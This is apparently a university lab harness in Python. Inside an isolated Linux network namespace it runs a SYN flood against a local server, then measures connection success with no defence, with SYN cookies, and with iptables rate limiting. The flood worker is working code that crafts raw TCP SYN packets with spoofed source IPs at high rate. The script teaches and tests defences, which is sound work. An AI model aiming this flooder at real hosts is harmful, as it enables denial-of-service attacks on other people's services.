#!/usr/bin/env python3
"""
run_live_experiments.py
Autonomous Practical Verification Harness for CSE 406 - Topic 06
Tests:
  1. Baseline Vulnerability: SYN Flood with tcp_syncookies=0 -> 100% DoS
  2. Defense 1: Cryptographic Stateless TCP SYN Cookies -> 90-100% Recovery
  3. Defense 2: Netfilter iptables Rate Limiting -> Drop metrics telemetry
Runs inside unprivileged Linux network namespaces (no sudo password required).
"""

import subprocess
import sys
import os

SCRIPT = """
set -e
echo "======================================================================"
echo "   CSE 406: PRACTICAL ATTACK & DEFENSE VERIFICATION HARNESS"
echo "======================================================================"

# Setup network namespace interfaces
ip link set lo up
ip link add veth0 type veth peer name veth1
ip addr add 192.168.10.2/24 dev veth0
ip addr add 192.168.10.10/24 dev veth1
ip link set veth0 up
ip link set veth1 up

for f in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 0 > $f; done
for f in /proc/sys/net/ipv4/conf/*/accept_local; do echo 1 > $f; done

cat << 'PYEOF' > /tmp/runner.py
import socket, struct, time, random, threading, subprocess

SERVER_IP = "192.168.10.10"
PORT = 8080
BACKLOG = 8

def test_scenario(name, syncookies_enabled, use_iptables=False):
    print(f"\\n>>> RUNNING TEST: {name}")
    
    with open('/proc/sys/net/ipv4/tcp_syncookies', 'w') as f:
        f.write("1" if syncookies_enabled else "0")
    with open('/proc/sys/net/ipv4/tcp_max_syn_backlog', 'w') as f:
        f.write(str(BACKLOG))
        
    if use_iptables:
        subprocess.run(["iptables", "-F", "INPUT"])
        subprocess.run(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(PORT), "--syn", 
                        "-m", "limit", "--limit", "20/s", "--limit-burst", "40", "-j", "ACCEPT"])
        subprocess.run(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(PORT), "--syn", "-j", "DROP"])
    else:
        subprocess.run(["iptables", "-F", "INPUT"], stderr=subprocess.DEVNULL)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((SERVER_IP, PORT))
    srv.listen(BACKLOG)
    
    stop_event = threading.Event()
    
    def flood_worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        def chksum(msg):
            s = 0
            for i in range(0, len(msg), 2):
                w = (msg[i] << 8) + (msg[i+1])
                s = s + w
            s = (s >> 16) + (s & 0xffff)
            return (~s) & 0xffff

        daddr = socket.inet_aton(SERVER_IP)
        idx = 0
        while not stop_event.is_set():
            src_ip = f"192.168.10.{20 + (idx % 200)}"
            sport = 10000 + (idx % 50000)
            saddr = socket.inet_aton(src_ip)
            iph = struct.pack("!BBHHHBBH4s4s", (4<<4)|5, 0, 40, random.randint(1,65535), 0, 64, socket.IPPROTO_TCP, 0, saddr, daddr)
            tcph = struct.pack("!HHLLBBHHH", sport, PORT, 1000+idx, 0, (5<<4), 0x02, socket.htons(5840), 0, 0)
            psh = struct.pack("!4s4sBBH", saddr, daddr, 0, socket.IPPROTO_TCP, len(tcph))
            tcph = struct.pack("!HHLLBBH", sport, PORT, 1000+idx, 0, (5<<4), 0x02, socket.htons(5840)) + struct.pack("H", socket.htons(chksum(psh + tcph))) + struct.pack("!H", 0)
            try:
                s.sendto(iph + tcph, (SERVER_IP, 0))
            except:
                pass
            idx += 1
            time.sleep(0.0004) # ~2500 pps
        s.close()

    t = threading.Thread(target=flood_worker)
    t.daemon = True
    t.start()
    time.sleep(0.4)

    out = subprocess.check_output(["ss", "-tan", "state", "syn-recv"]).decode()
    syn_recv_count = len([l for l in out.splitlines() if f":{PORT}" in l])
    
    success = 0
    failures = 0
    latencies = []
    
    for i in range(10):
        t0 = time.time()
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(0.5)
        try:
            c.connect((SERVER_IP, PORT))
            lat = (time.time() - t0) * 1000
            success += 1
            latencies.append(lat)
            c.close()
        except Exception:
            lat = (time.time() - t0) * 1000
            failures += 1
            latencies.append(lat)
            c.close()
        time.sleep(0.03)

    stop_event.set()
    t.join()
    srv.close()

    avg_lat = sum(latencies)/len(latencies) if latencies else 0
    print(f"[*] Sockets currently in SYN_RECV state: {syn_recv_count}/{BACKLOG}")
    print(f"[*] Legitimate Client Handshake: Success={success}/10, Failures={failures}/10")
    print(f"[*] Mean Connection Latency: {avg_lat:.2f} ms")
    if use_iptables:
        print("[*] Iptables Ingress Drop Telemetry:")
        res = subprocess.check_output(["iptables", "-L", "INPUT", "-v", "-n"]).decode()
        for line in res.splitlines():
            if "dpt:8080" in line:
                print("    " + line.strip())

# Experiment 1
test_scenario("Experiment 1: Baseline Attack (tcp_syncookies = 0)", syncookies_enabled=False)

# Experiment 2
test_scenario("Experiment 2: Defense 1 Activated (tcp_syncookies = 1)", syncookies_enabled=True)

# Experiment 3
test_scenario("Experiment 3: Defense 2 Activated (iptables Ingress Rate Limiting)", syncookies_enabled=False, use_iptables=True)

PYEOF

python3 /tmp/runner.py
"""

def main():
    print("[+] Launching live experimental verification in isolated Linux namespace...")
    cmd = ["unshare", "-r", "-n", "bash", "-c", SCRIPT]
    res = subprocess.run(cmd)
    sys.exit(res.returncode)

if __name__ == "__main__":
    main()
